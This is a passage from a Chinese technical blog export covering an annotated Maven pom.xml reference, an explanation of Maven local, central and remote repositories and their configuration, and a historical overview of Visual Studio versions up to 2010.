&lt;url&gt;http://192.168.1.169:9999/repository/&lt;/url&gt;</span><br><span class="line">            &lt;!-- 用于定位和排序构件的仓库布局类型-可以是default（默认）或者legacy（遗留）。Maven 2为其仓库提供了一个默认的布局；然 而，Maven 1.x有一种不同的布局。我们可以使用该元素指定布局是default（默认）还是legacy（遗留）。--&gt;</span><br><span class="line">            &lt;layout&gt;default&lt;/layout&gt;</span><br><span class="line">        &lt;/repository&gt;</span><br><span class="line">    &lt;/repositories&gt;</span><br><span class="line">    &lt;!--发现插件的远程仓库列表，这些插件用于构建和报表--&gt;</span><br><span class="line">    &lt;pluginRepositories&gt;</span><br><span class="line">     &lt;!--包含需要连接到远程插件仓库的信息.参见repositories/repository元素--&gt;</span><br><span class="line">  &lt;pluginRepository&gt;</span><br><span class="line">   ......</span><br><span class="line">  &lt;/pluginRepository&gt;</span><br><span class="line"> &lt;/pluginRepositories&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--该元素描述了项目相关的所有依赖。 这些依赖组成了项目构建过程中的一个个环节。它们自动从项目定义的仓库中下载。要获取更多信息，请看项目依赖机制。--&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">   &lt;!--依赖的group ID--&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.maven&lt;/groupId&gt;</span><br><span class="line">            &lt;!--依赖的artifact ID--&gt;</span><br><span class="line">            &lt;artifactId&gt;maven-artifact&lt;/artifactId&gt;</span><br><span class="line">            &lt;!--依赖的版本号。 在Maven 2里, 也可以配置成版本号的范围。--&gt;</span><br><span class="line">            &lt;version&gt;3.8.1&lt;/version&gt;</span><br><span class="line">            &lt;!-- 依赖类型，默认类型是jar。它通常表示依赖的文件的扩展名，但也有例外。一个类型可以被映射成另外一个扩展名或分类器。类型经常和使用的打包方式对应， 尽管这也有例外。一些类型的例子：jar，war，ejb-client和test-jar。如果设置extensions为 true，就可以在 plugin里定义新的类型。所以前面的类型的例子不完整。--&gt;</span><br><span class="line">            &lt;type&gt;jar&lt;/type&gt;</span><br><span class="line">            &lt;!-- 依赖的分类器。分类器可以区分属于同一个POM，但不同构建方式的构件。分类器名被附加到文件名的版本号后面。例如，如果你想要构建两个单独的构件成 JAR，一个使用Java 1.4编译器，另一个使用Java 6编译器，你就可以使用分类器来生成两个单独的JAR构件。--&gt;</span><br><span class="line">            &lt;classifier&gt;&lt;/classifier&gt;</span><br><span class="line">            &lt;!--依赖范围。在项目发布过程中，帮助决定哪些构件被包括进来。欲知详情请参考依赖机制。</span><br><span class="line">                - compile ：默认范围，用于编译</span><br><span class="line">                - provided：类似于编译，但支持你期待jdk或者容器提供，类似于classpath</span><br><span class="line">                - runtime: 在执行时需要使用</span><br><span class="line">                - test:    用于test任务时使用</span><br><span class="line">                - system: 需要外在提供相应的元素。通过systemPath来取得</span><br><span class="line">                - systemPath: 仅用于范围为system。提供相应的路径</span><br><span class="line">                - optional:   当项目自身被依赖时，标注依赖是否传递。用于连续依赖时使用--&gt;</span><br><span class="line">            &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">            &lt;!--仅供system范围使用。注意，不鼓励使用这个元素，并且在新的版本中该元素可能被覆盖掉。该元素为依赖规定了文件系统上的路径。需要绝对路径而不是相对路径。推荐使用属性匹配绝对路径，例如$&#123;java.home&#125;。--&gt;</span><br><span class="line">            &lt;systemPath&gt;&lt;/systemPath&gt;</span><br><span class="line">            &lt;!--当计算传递依赖时， 从依赖构件列表里，列出被排除的依赖构件集。即告诉maven你只依赖指定的项目，不依赖项目的依赖。此元素主要用于解决版本冲突问题--&gt;</span><br><span class="line">            &lt;exclusions&gt;</span><br><span class="line">             &lt;exclusion&gt;</span><br><span class="line">                    &lt;artifactId&gt;spring-core&lt;/artifactId&gt;</span><br><span class="line">                    &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">                &lt;/exclusion&gt;</span><br><span class="line">            &lt;/exclusions&gt;</span><br><span class="line">            &lt;!--可选依赖，如果你在项目B中把C依赖声明为可选，你就需要在依赖于B的项目（例如项目A）中显式的引用对C的依赖。可选依赖阻断依赖的传递性。--&gt;</span><br><span class="line">            &lt;optional&gt;true&lt;/optional&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">    &lt;!--不赞成使用. 现在Maven忽略该元素.--&gt;</span><br><span class="line">    &lt;reports&gt;&lt;/reports&gt;</span><br><span class="line">    &lt;!--该元素描述使用报表插件产生报表的规范。当用户执行“mvn site”，这些报表就会运行。 在页面导航栏能看到所有报表的链接。--&gt;</span><br><span class="line"> &lt;reporting&gt;</span><br><span class="line">  &lt;!--true，则，网站不包括默认的报表。这包括“项目信息”菜单中的报表。--&gt;</span><br><span class="line">  &lt;excludeDefaults/&gt;</span><br><span class="line">  &lt;!--所有产生的报表存放到哪里。默认值是$&#123;project.build.directory&#125;/site。--&gt;</span><br><span class="line">  &lt;outputDirectory/&gt;</span><br><span class="line">  &lt;!--使用的报表插件和他们的配置。--&gt;</span><br><span class="line">  &lt;plugins&gt;</span><br><span class="line">   &lt;!--plugin元素包含描述报表插件需要的信息--&gt;</span><br><span class="line">   &lt;plugin&gt;</span><br><span class="line">    &lt;!--报表插件在仓库里的group ID--&gt;</span><br><span class="line">    &lt;groupId/&gt;</span><br><span class="line">    &lt;!--报表插件在仓库里的artifact ID--&gt;</span><br><span class="line">    &lt;artifactId/&gt;</span><br><span class="line">    &lt;!--被使用的报表插件的版本（或版本范围）--&gt;</span><br><span class="line">    &lt;version/&gt;</span><br><span class="line">    &lt;!--任何配置是否被传播到子项目--&gt;</span><br><span class="line">    &lt;inherited/&gt;</span><br><span class="line">    &lt;!--报表插件的配置--&gt;</span><br><span class="line">    &lt;configuration/&gt;</span><br><span class="line">    &lt;!--一组报表的多重规范，每个规范可能有不同的配置。一个规范（报表集）对应一个执行目标 。例如，有1，2，3，4，5，6，7，8，9个报表。1，2，5构成A报表集，对应一个执行目标。2，5，8构成B报表集，对应另一个执行目标--&gt;</span><br><span class="line">    &lt;reportSets&gt;</span><br><span class="line">     &lt;!--表示报表的一个集合，以及产生该集合的配置--&gt;</span><br><span class="line">     &lt;reportSet&gt;</span><br><span class="line">      &lt;!--报表集合的唯一标识符，POM继承时用到--&gt;</span><br><span class="line">      &lt;id/&gt;</span><br><span class="line">      &lt;!--产生报表集合时，被使用的报表的配置--&gt;</span><br><span class="line">      &lt;configuration/&gt;</span><br><span class="line">      &lt;!--配置是否被继承到子POMs--&gt;</span><br><span class="line">      &lt;inherited/&gt;</span><br><span class="line">      &lt;!--这个集合里使用到哪些报表--&gt;</span><br><span class="line">      &lt;reports/&gt;</span><br><span class="line">     &lt;/reportSet&gt;</span><br><span class="line">    &lt;/reportSets&gt;</span><br><span class="line">   &lt;/plugin&gt;</span><br><span class="line">  &lt;/plugins&gt;</span><br><span class="line"> &lt;/reporting&gt;</span><br><span class="line"> &lt;!-- 继承自该项目的所有子项目的默认依赖信息。这部分的依赖信息不会被立即解析,而是当子项目声明一个依赖（必须描述group ID和 artifact ID信息），如果group ID和artifact ID以外的一些信息没有描述，则通过group ID和artifact ID 匹配到这里的依赖，并使用这里的依赖信息。--&gt;</span><br><span class="line"> &lt;dependencyManagement&gt;</span><br><span class="line">  &lt;dependencies&gt;</span><br><span class="line">   &lt;!--参见dependencies/dependency元素--&gt;</span><br><span class="line">   &lt;dependency&gt;</span><br><span class="line">    ......</span><br><span class="line">   &lt;/dependency&gt;</span><br><span class="line">  &lt;/dependencies&gt;</span><br><span class="line"> &lt;/dependencyManagement&gt;</span><br><span class="line">    &lt;!--项目分发信息，在执行mvn deploy后表示要发布的位置。有了这些信息就可以把网站部署到远程服务器或者把构件部署到远程仓库。--&gt;</span><br><span class="line">    &lt;distributionManagement&gt;</span><br><span class="line">        &lt;!--部署项目产生的构件到远程仓库需要的信息--&gt;</span><br><span class="line">        &lt;repository&gt;</span><br><span class="line">         &lt;!--是分配给快照一个唯一的版本号（由时间戳和构建流水号）？还是每次都使用相同的版本号？参见repositories/repository元素--&gt;</span><br><span class="line">   &lt;uniqueVersion/&gt;</span><br><span class="line">   &lt;id&gt;banseon-maven2&lt;/id&gt;</span><br><span class="line">   &lt;name&gt;banseon maven2&lt;/name&gt;</span><br><span class="line">            &lt;url&gt;file://$&#123;basedir&#125;/target/deploy&lt;/url&gt;</span><br><span class="line">            &lt;layout/&gt;</span><br><span class="line">  &lt;/repository&gt;</span><br><span class="line">  &lt;!--构件的快照部署到哪里？如果没有配置该元素，默认部署到repository元素配置的仓库，参见distributionManagement/repository元素--&gt;</span><br><span class="line">  &lt;snapshotRepository&gt;</span><br><span class="line">   &lt;uniqueVersion/&gt;</span><br><span class="line">   &lt;id&gt;banseon-maven2&lt;/id&gt;</span><br><span class="line">            &lt;name&gt;Banseon-maven2 Snapshot Repository&lt;/name&gt;</span><br><span class="line">            &lt;url&gt;scp://svn.baidu.com/banseon:/usr/local/maven-snapshot&lt;/url&gt;</span><br><span class="line">   &lt;layout/&gt;</span><br><span class="line">  &lt;/snapshotRepository&gt;</span><br><span class="line">  &lt;!--部署项目的网站需要的信息--&gt;</span><br><span class="line">        &lt;site&gt;</span><br><span class="line">         &lt;!--部署位置的唯一标识符，用来匹配站点和settings.xml文件里的配置--&gt;</span><br><span class="line">            &lt;id&gt;banseon-site&lt;/id&gt;</span><br><span class="line">            &lt;!--部署位置的名称--&gt;</span><br><span class="line">            &lt;name&gt;business api website&lt;/name&gt;</span><br><span class="line">            &lt;!--部署位置的URL，按protocol://hostname/path形式--&gt;</span><br><span class="line">            &lt;url&gt;</span><br><span class="line">                scp://svn.baidu.com/banseon:/var/www/localhost/banseon-web</span><br><span class="line">            &lt;/url&gt;</span><br><span class="line">        &lt;/site&gt;</span><br><span class="line">  &lt;!--项目下载页面的URL。如果没有该元素，用户应该参考主页。使用该元素的原因是：帮助定位那些不在仓库里的构件（由于license限制）。--&gt;</span><br><span class="line">  &lt;downloadUrl/&gt;</span><br><span class="line">  &lt;!--如果构件有了新的group ID和artifact ID（构件移到了新的位置），这里列出构件的重定位信息。--&gt;</span><br><span class="line">  &lt;relocation&gt;</span><br><span class="line">   &lt;!--构件新的group ID--&gt;</span><br><span class="line">   &lt;groupId/&gt;</span><br><span class="line">   &lt;!--构件新的artifact ID--&gt;</span><br><span class="line">   &lt;artifactId/&gt;</span><br><span class="line">   &lt;!--构件新的版本号--&gt;</span><br><span class="line">   &lt;version/&gt;</span><br><span class="line">   &lt;!--显示给用户的，关于移动的额外信息，例如原因。--&gt;</span><br><span class="line">   &lt;message/&gt;</span><br><span class="line">  &lt;/relocation&gt;</span><br><span class="line">  &lt;!-- 给出该构件在远程仓库的状态。不得在本地项目中设置该元素，因为这是工具自动更新的。有效的值有：none（默认），converted（仓库管理员从 Maven 1 POM转换过来），partner（直接从伙伴Maven 2仓库同步过来），deployed（从Maven 2实例部 署），verified（被核实时正确的和最终的）。--&gt;</span><br><span class="line">  &lt;status/&gt;</span><br><span class="line">    &lt;/distributionManagement&gt;</span><br><span class="line">    &lt;!--以值替代名称，Properties可以在整个POM中使用，也可以作为触发条件（见settings.xml配置文件里activation元素的说明）。格式是&lt;name&gt;value&lt;/name&gt;。--&gt;</span><br><span class="line">    &lt;properties/&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>maven</tag>
      </tags>
  </entry>
  <entry>
    <title>MAVEN仓库repository介绍</title>
    <url>/blog/tools/maven/repository/</url>
    <content><![CDATA[<h2 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h2><p>在Maven中，任何一个依赖，插件或者项目构建的输出，都可以成为构件。</p>
<p>得益于坐标机制，任何Maven项目使用任何一个构件的方式都是完全相同的。在此基础上，Maven可以在某一个位置统一存放所有Maven项目共享的构件，这个统一的位置就是<strong>仓库</strong>。实际的Maven项目将不在各自存储其依赖文件，它们只需要声明这些依赖的坐标，在需要的时候，Maven会自动根据坐标找到仓库中的构件，并使用它们。\</p>
<h2 id="仓库的布局"><a href="#仓库的布局" class="headerlink" title="仓库的布局"></a>仓库的布局</h2><p>任何一个构件都有其唯一的坐标，可以根据这个坐标定义其在仓库中的唯一存储路径，这便是Maven的仓库布局方式。</p>
<p>例如：log4j:log4j:1.2.15这一依赖，其对应的仓库路径为log4j&#x2F;log4j&#x2F;1.2.15&#x2F;log4j-1.2.15.jar。该<strong>路径与坐标的大致对应关系为groupId<br>&#x2F; artifactId &#x2F; version &#x2F; artifactId-version.packaging</strong>。</p>
<p>Maven仓库是基于简单文件系统存储的。</p>
<h2 id="仓库的分类"><a href="#仓库的分类" class="headerlink" title="仓库的分类"></a>仓库的分类</h2><p>对于Maven来说，仓库只分为两类：本地仓库和远程仓库。</p>
<p><strong>当Maven根据坐标寻找构件的时候，它首先会查看本地仓库，如果本地仓库存在此构件，则直接使用；如果本地仓库不存在此构件，或者需要查看是否有更新的构件版本，Maven就会去远程仓库查找，发现需要的构件之后，下载到本地仓库再使用。如果本地仓库和远程仓库都没有需要的构件，Maven就会报错</strong>。</p>
<p>远程仓库的分类：</p>
<ul>
<li>中央仓库——是Maven核心自带的远程仓库，它包含了绝大部分开源的构件。在默认配置下，当本地仓库没有Maven需要的构件的时候，它就会尝试从中央仓库下载。</li>
<li>私服——在局域网内假设一个私有的仓库服务器。</li>
<li>其他公开的远程仓库——</li>
</ul>
<h3 id="本地仓库"><a href="#本地仓库" class="headerlink" title="本地仓库"></a>本地仓库</h3><p>一般来说，在Maven项目目录下，没有哲如lib&#x2F;这样用来存放依赖文件的目录。当Maven在执行编译或测试时，如果需要使用依赖文件，它总是基于坐标使用本地仓库的依赖文件。</p>
<p>默认情况下，不管是在Windows还是Linux下，每个用户在自己的用户目录下都有一个路径名为**.m2<br>&#x2F; repository**的仓库目录。</p>
<p>如果用户想要自定义本地仓库的目录地址，这时，可以编辑文件~&#x2F;.m2&#x2F;settings.xml，设置localRepository元素的值为想要的仓库地址，例如：</p>
<pre><code>    D:\java\repository\
</code></pre>
<h3 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h3><p>当用户输入第一条Maven命令之后，Maven才会创建本地仓库，然后根据配置和需要，从远程仓库下载构件至本地仓库。</p>
<p>对于Maven来说，每一个用户只有一个本地仓库，但可以配置访问很多远程仓库。</p>
<ul>
<li>中央仓库</li>
</ul>
<p>中央仓库是一个默认的远程仓库，Maven的安装文件自带了中央仓库的配置。打开文件￥M2_HOME&#x2F;lib&#x2F;maven-model-builder-3.0.jar，访问路径org&#x2F;apache&#x2F;maven&#x2F;model&#x2F;pom-4.0.0.xml，看到如下配置：</p>
<pre><code>        central
        Maven Repository Switchboard
        http://repol.maven.org/maven2
        default
        
            false
        
    
</code></pre>
<p><strong>包含这段配置的文件是所有Maven项目都会继承的超级POM</strong>。</p>
<p>私服</p>
<p>私服是一种特殊的远程仓库，它是假设在局域网内的仓库服务，私服代理广域网上的远程仓库，供局域网内的Maven用户使用。当Maven需要下载构件的时候，它从私服请求，如果私服上不存在该构件，则从外部的远程仓库下载，缓存在私服上之后，再为Maven的下载提供请求服务。</p>
<h2 id="远程仓库的配置"><a href="#远程仓库的配置" class="headerlink" title="远程仓库的配置"></a>远程仓库的配置</h2><p>如果项目需要的构件存在于另外一个远程仓库中，如JBoss<br>Maven仓库，这时，可以在<strong>POM</strong>中配置该仓库，例如：</p>
<pre><code>... ...
    
        
            jboss
            JBoss Repository/name&gt;
            http://repository.jboss.com.maven2/
            
                true
            
            
                false
            
            default
    

...
</code></pre>
<p>在repositories元素下，可以使用repository子元素声明一个或者多个远程仓库。任何一个仓库声明的id必须是唯一的。如果其他仓库声明使用中央残酷的id——central，就会覆盖中央仓库的配置。</p>
<p>release子元素enabled的为true，表示开启JBoss仓库的发布版本下载支持。</p>
<p>snapshot的enabled的值为flase，表示关闭JBoss仓库的快照版本的支持，Maven只会从JBoss仓库下载发布版的构件，而不会下载快照版的构件。</p>
<p>对于release和snapshot来说，除了enabled，它们还包含另外两个子元素updatePolicy和checksumPolicy：</p>
<h3 id="远程仓库的认证"><a href="#远程仓库的认证" class="headerlink" title="远程仓库的认证"></a>远程仓库的认证</h3><p>大部分远程仓库无须认证就可以访问，但有时候出于安全方面的考虑，需要提供认证信息才能访问一些远程仓库。</p>
<p>配置认证信息和配置仓库信息不同，<strong>仓库信息可以直接配置在POM文件中，但是认证信息必须配置在settings.xml文件中</strong>。</p>
<p>假设需要一个id为my-proj的仓库配置认证信息，编辑settings.xml文件如下：</p>
<pre><code>    ... ...
    
        
            my-proj
            repo-user
            repo-pwd
        
    
    ... ...
</code></pre>
<p>settings.xml中server元素的id必须与POM中需要认证的repository元素的id完全一致，<strong>这个id将认证信息与仓库配置联系在了一起</strong>。</p>
<h2 id="仓库搜索服务"><a href="#仓库搜索服务" class="headerlink" title="仓库搜索服务"></a>仓库搜索服务</h2><p>使用Maven进行日常开发的时候，一个常见的问题就是如何寻找需要的依赖，我们可能只知道需要使用类库的项目名称，但添加Maven依赖要求提供确切的Maven坐标。这时，就可以使用仓库所有服务来根据关键字得到Maven坐标。</p>
<p><a href="https://repository.sonatype.org/">https://repository.sonatype.org/</a></p>
<p><a href="http://www.mvnrepository.com/">http://www.mvnrepository.com/</a></p>
<p><a href="http://search.maven.org/">http://search.maven.org/</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>maven</tag>
      </tags>
  </entry>
  <entry>
    <title>Visual Studio版本简述</title>
    <url>/blog/tools/vs/vsbbjj/</url>
    <content><![CDATA[<p>  发布时间   名称                 版本号   平台</p>
<hr>
<p>  1998 年    Visual Studio 6.0    6.0       <br>  2002 年    Visual Studio .NET   7.0      .NET 框架1.0<br>  2003 年    Visual Studio 2003   7.1      .NET 框架1.1<br>  2005 年    Visual Studio 2005   8.0      .NET 框架2.0<br>  2008年     Visual Studio 2008   9.0      .NET 框架3.5<br>  2010年     Visual Studio 2010   10.0     .NET 框架4.0</p>
<h3 id="Visual-Studio简介"><a href="#Visual-Studio简介" class="headerlink" title="Visual Studio简介"></a>Visual Studio简介</h3><p>Visual Studio 是微软公司推出的开发环境。是目前最流行的 Windows平台应用程序开发环境。目前已经开发到 10.0 版本，也就是 Visual Studio 2010。</p>
<p>Visual Studio 可以用来创建 Windows 平台下的 Windows应用程序和网络应用程序，也可以用来创建网络服务、智能设备应用程序和Office 插件。</p>
<p>1998 年，微软公司发布了 Visual Studio 6.0。所有开发语言的开发环境版本均升至 6.0。这也是 Visual Basic最后一次发布。</p>
<p>2002 年，随着 .NET 口号的提出与 Windows XP &#x2F; Office XP的发布，微软发布了 Visual Studio .NET（内部版本号为 7.0）。在这个版本的Visual Studio 中，微软剥离了 Visual FoxPro 作为一个单独的开发环境以Visual FoxPro 7.0 单独销售，同时取消了 Visual InterDev。与此同时，微软引入了建立在 .NET框架上（版本1.0）的托管代码机制以及一门新的语言 C# （读作 C Sharp，意为C++++）。C# 是一门建立在 C++ 和 Java 基础上的现代语言，是编写 .NET框架的语言。</p>
<p>.NET 的通用语言框架机制（Common Language Runtime,CLR），其目的是在同一个项目中支持不同的语言所开发的组件。所有 CLR支持的代码都会被解释成为 CLR 执行的机器代码然后运行。</p>
<p>Visual Basic、Visual C++ 都被扩展为支持托管代码机制的开发环境，且 Visual Basic .NET更是从 Visual Basic 脱胎换骨，彻底支持面向对象的编程机制。而Visual J++ 也变为 Visual J#。后者仅语法同 Java 相同，但是面向的不是Java 虚拟机，而是 .NET Framework。</p>
<p>2003 年，微软对 Visual Studio 2002 进行了部分修订，以 Visual Studio 2003的名义发布（内部版本号为 7.1）。Visio作为使用统一建模语言（UML）架构应用程序框架的程序被引入，同时被引入的还包括移动设备支持和企业模版。.NET框架也升级到了 1.1。</p>
<p>2005 年，微软发布了 Visual Studio 2005。.NET字眼从各种语言的名字中被抹去，但是这个版本的 Visual Studio 仍然还是面向.NET框架的（版本2.0）。它同时也能开发跨平台的应用程序，如开发使用微软操作系统的手机的程序等。总体来说是一个非常庞大的软件，甚至包含代码测试功能。<br>这个版本的 Visual Studio包含有众多版本，分别面向不同的开发角色。同时还永久提供免费的 Visual Studio Express </p>
<p>随着即将发布的 Windows Vista （内部名称：Longhorn) 和 Office 2007，Visual Studio 9 也渐渐浮出水面。Visual Studio 9目前可以确定的是支持建立于 DHTML 基础上的 AJax 技术，这种微软在 Visual InterDev时代提出的基于异步的客户端动态网页技术在当年并没有像微软预期中的那么流行起来，反而随着GMail 等应用而东山再起，渐渐成为主流网络应用之一。同时 Visual Studio 9会强化对于数据库的支持以及微软新的基于工作流（Workflow）的编程模型。预计为了保持与Office 系列的统一，Visual Studio 9 的名称为 Visual Studio 2008。</p>
<p>2008年，Visual Studio 9也就是Visual Studio 2008将和Windows Server2008同时发布，创建满足关键性要求的多层次的智能客户端、Web、移动或基于MicrosoftOffice的应用程序。</p>
<p>使用Visual Studio 2005, 专业开发人员能够：</p>
<p>使用改进后的可视化设计工具、编程语言和代码编辑器，享受高效率的开发环境</p>
<p>在统一的开发环境中，开发并调试多层次的服务器应用程序</p>
<p>使用集成的可视化数据库设计和报告工具，创建SQL Server 2005解决方案</p>
<p>使用Visual Studio SDK创建可以扩展Visual Studio IDE的工具</p>
<h3 id="Visual-Studio-6-0"><a href="#Visual-Studio-6-0" class="headerlink" title="Visual Studio 6.0"></a>Visual Studio 6.0</h3><p>1998 年，微软公司发布了 Visual Studio 6.0。所有开发语言的开发环境版本均升至 6.0。</p>
<p>由于和以前的版本兼容，又有稳定高效的开发性能，得到了广泛的支持。以后推出的.NET的平台由于不身后兼容，版之间差别过大所以没有真正被广泛使用。但随着一次又一次的升级更新，据说Visual Studio 2010将会稳定下来，成为下一代的Visual Studio 6.0 。</p>
<p>Microsoft Visual Studio 6.0 简体中文企业版，包含以下内容：</p>
<p>Microsoft Visual Studio Enterprise Edition</p>
<p>Microsoft Visual Basic Microsoft Visual C</p>
<p>Microsoft Visual Database Tools</p>
<p>Microsoft Visual FoxPro</p>
<p>Microsoft Visual InterDev</p>
<p>Microsoft Visual J</p>
<p>Microsoft Visual SourceSafe</p>
<h3 id="Visual-Studio-NET"><a href="#Visual-Studio-NET" class="headerlink" title="Visual Studio .NET"></a>Visual Studio .NET</h3><p>2002 年，微软发布了 Visual Studio .NET（内部版本号为7.0）。这是.NET第一次现身，也叫Visual Studio .NET 2002。</p>
<p>但是没有像WINXP一样产生巨大的影响，之后的改进版Visual Studio2003可能是.NET的第一次成功。.NET的特点是跨平台，多语言联合开发，强大的Visual Studio工程支持。</p>
<p>与Visual Studio6.0相比Visual Studio .NET ：</p>
<p>剥离了 Visual FoxPro 作为一个单独的开发环境以 Visual FoxPro 7.0单独销售，同时取消了 Visual InterDev。</p>
<p>引入了建立在 .NET 框架上（版本1.0）的托管代码机制以及一门新的语言 C#（读作 C Sharp，意为 C++++）。</p>
<p>C# 是一门建立在 C++ 和 Java 基础上的现代语言，是编写 .NET 框架的语言。</p>
<p>具有了本质上的不同，是一次重大的飞越。</p>
<h3 id="Visual-Studio-2003"><a href="#Visual-Studio-2003" class="headerlink" title="Visual Studio 2003"></a>Visual Studio 2003</h3><p>Visual Studio .NET 2003，它是 Microsoft的第二代开发工具，用于构建和部署功能强大而安全的连接 Microsoft .NET的软件。</p>
<p>Visual Studio .NET 2003 包含 Windows .NET Framework的一个增强版本Windows .NET Framework 1.1。</p>
<p>Windows .NET Framework 1.1版在前一版本的基础上增添了新的能力、功能增强和文档改进。</p>
<p>通过对 .NET Compact Framework 的集成支持，Visual Studio .NET 2003将移动和嵌入式设备，如 Pocket PC 和其他采用 Microsoft Windows CE .NET操作系统的设备，带入 .NET。</p>
<p>如今，开发人员能够使用同样的编程模型、开发工具及编程技能，来构建应用范围广泛--从小设备到最大的数据中心--的应用程序。</p>
<p>包含了:</p>
<p>Microsoft Visual Basic .NET</p>
<p>Microsoft Visual C++ .NET</p>
<p>Microsoft Visual C# .NET</p>
<h3 id="Visual-Studio-2005"><a href="#Visual-Studio-2005" class="headerlink" title="Visual Studio 2005"></a>Visual Studio 2005</h3><p>VS.NET2005 简体中文版</p>
<p>含MSDN 2005 简体中文版</p>
<p>该版本的 Visual Studio 2005 和 .NET Framework 2.0将在应用程序开发的所有方面取得大幅进展。首先，Visual Studio 2005根据开发人员个人的需要调整软件开发体验，设置新的开发人员工作效率标准。这一”个性化工作效率”将在开发环境和.NET Framework类库中提供相应的功能，以帮助开发人员在最少的时间内克服其最为紧迫的困难。其次，Visual Studio 2005 使开发人员能够通过与 Microsoft Office System 和 SQL Server 2005的更好集成，在更广泛的应用程序开发方案中应用现有的技能。最后，VisualStu dio 2005将提供一组新的工具和功能，以满足目前大规模企业的应用程序开发需要。</p>
<p>Visual Studio 2005 的中心内容包括：</p>
<p>语言和 IDE 工作效率。作为 Visual Studio 一部分的四种语言（VisualBasic、Visual C++、Visual C# 和 Visual J#），Microsoft为其每一种语音都构建了独特的特征。这一语言上的革新将丰富每个开发人员群体的编程体验，而不会牺牲现有的语言功能和互操作性。通过语言革新展现的功能将由IDE 体现，并且为所有的开发人员团体提供个性化的工作效率。</p>
<p>Microsoft .NET Framework。.NET Framework 2.0 将在 .NET Framework类库中引入增强功能。通过新的控件和设计器功能，将简化 Windows客户端应用程序开发，而”ClickOnce”技术的引入将显著简化 Windows客户端应用程序部署。ASP.NET 2.0 引入一组新的功能，以改善 Web应用程序开发并在根本上减轻编码工作。其他增强功能包括，更有效的 ADO.NET数据访问、对最新 Web 服务标准的支持以及基于设备的开发的扩展功能。</p>
<p>Microsoft Office 解决方案开发。Visual Studio 2005 Tool for Microsoft Office System 版本将显著增强基于 Microsoft Office Excel 2003 和Microsoft Office Word 2003 的业务解决方案的开发。生成 Office解决方案的开发人员将得益于以下几方面：Visual Studio 和 Office之间改进的集成、熟悉的编码体验、改善的安全性和部署。</p>
<p>SQL Server 2005 解决方案开发。SQL Server 2005将数据库对象的开发与调试集成到 Visual Studio 2005开发环境中，从而使开发人员能够使用与其目前用于编写托管组件和应用程序相同的工具来生成和部署数据库对象。</p>
<p>企业开发和生存期支持。Microsoft 计划在 2005版本中为架构师和企业开发人员提供改善的支持。新的工具将提供增强的项目分析和设计、软件配置管理和部署，以及可伸缩的、新的生成引擎，以确保Microsoft 开发人员工具能够跨越应用程序生存期。</p>
<h3 id="Visual-Studio-2008-概述"><a href="#Visual-Studio-2008-概述" class="headerlink" title="Visual Studio 2008 概述"></a>Visual Studio 2008 概述</h3><p>Microsoft Visual Studio 2008使开发人员能够快速创建高质量、用户体验丰富而又紧密联系的应用程序，充分展示了Microsoft 开发智能客户端应用程序的构想。借助 Visual Studio 2008，采集和分析信息将变得更为简单便捷，业务决策也会因此变得更为有效。任何规模的组织都可以使用Visual Studio 2008 快速创建能够利用 Windows Vista? 和 2007 Office system的更安全、更易于管理并且更可靠的应用程序。</p>
<p>Visual Studio 2008 在三个方面为开发人员提供了关键改进：</p>
<p>1.快速的应用程序开发</p>
<p>2.高效的团队协作</p>
<p>3.突破性的用户体验</p>
<p>Visual Studio 2008提供了高级开发工具、调试功能、数据库功能和创新功能，帮助在各种平台上快速创建当前最先进的应用程序。</p>
<p>Visual Studio 2008 包括各种增强功能，例如可视化设计器（使用 .NET Framework 3.5 加速开发）、对 Web开发工具的大量改进，以及能够加速开发和处理所有类型数据的语言增强功能。Visual Studio 2008为开发人员提供了所有相关的工具和框架支持，帮助创建引人注目的、令人印象深刻并支持AJAX 的 Web 应用程序。</p>
<p>开发人员能够利用这些丰富的客户端和服务器端框架轻松构建以客户为中心的 Web应用程序，这些应用程序可以集成任何后端数据提供程序、在任何当前浏览器内运行并完全访问ASP.NET 应用程序服务和 Microsoft 平台。</p>
<p><strong>快速的应用程序开发</strong></p>
<p>为了帮助开发人员迅速创建先进的软件，Visual Studio 2008提供了改进的语言和数据功能，例如语言集成的查询(LINQ)，各个编程人员可以利用这些功能更轻松地构建解决方案以分析和处理信息。</p>
<p>Visual Studio 2008 还使开发人员能够从同一开发环境内创建面向多个 .NET Framework 版本的应用程序。开发人员能够构建面向 .NET Framework 2.0、3.0或 3.5 的应用程序，意味他们可以在同一环境中支持各种各样的项目。</p>
<p><strong>突破性的用户体验</strong></p>
<p>Visual Studio 2008为开发人员提供了在最新平台上加速创建紧密联系的应用程序的新工具，这些平台包括Web、Windows Vista、Office 2007、SQL Server 2008 和 Windows Server 2008。对于 Web，ASP.NET AJAX及其他新技术使开发人员能够迅速创建更高效、交互式更强和更个性化的新一代Web 体验。</p>
<p><strong>高效的团队协作</strong></p>
<p>Visual Studio 2008提供了帮助开发团队改进协作的扩展的和改进的服务项目，包括帮助将数据库专业人员和图形设计人员加入到开发流程的工具。</p>
<p><strong>使用 Microsoft .NET Framework 3.5</strong></p>
<p>.NET Framework提供了用于解决常见编程任务的构建基块（预制的软件），从而能够快速构造具有出色的最终用户体验的紧密联系的应用程序。在.NET Framework模型业务流程上有效构建的紧密联系的应用程序有利于在异类环境中实现系统集成。</p>
<p>Visual Studio 和 .NET Framework的结合使用减少了对公用管道代码的需要，从而缩短了开发时间并使开发人员能够集中精力解决业务问题。</p>
<p>.NET Framework 3.5 是在 .NET Framework 3.0的基础上构建的更高版本。得到增强的功能领域包括基类库、Windows workflow foundation、Windows Communication Foundation、Windows Presentation Foundation 和 Windows CardSpace。</p>
